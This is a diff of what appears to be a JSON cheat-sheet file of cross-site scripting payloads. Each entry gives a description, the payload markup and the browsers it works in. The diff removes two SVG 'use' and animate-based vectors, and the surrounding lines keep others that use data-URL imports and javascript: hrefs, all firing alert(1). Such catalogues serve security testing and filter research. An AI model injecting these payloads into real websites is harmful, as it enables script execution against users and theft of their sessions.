@@ -60,11 +60,6 @@
     "browsers": ["chrome", "firefox", "safari"]
   },
   {
-    "description": "SVG use element Chrome/Firefox",
-    "code": "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x\"></use></svg>",
-    "browsers": ["chrome", "firefox"]
-  },
-  {
     "description": "Import statement with data URL",
     "code": "<script>import('data:text/javascript,alert(1)')</script>",
     "browsers": ["chrome", "firefox", "safari"]
@@ -93,11 +88,6 @@
     "description": "Animate tag with keytimes and multiple values",
     "code": "<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values=\"https://portswigger.net?&semi;javascript:alert(1)&semi;0\" /><a id=xss><text x=20 y=20>XSS</text></a>",
     "browsers": ["chrome", "firefox", "safari"]
-  },
-  {
-    "description": "Animate tag with auto executing use element",
-    "code": "<svg><animate xlink:href=\"#x\" attributeName=\"href\" values=\"data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x\" /><use id=x />",
-    "browsers": ["chrome", "firefox"]
   },
   {
     "description": "Embed supports code attribute",
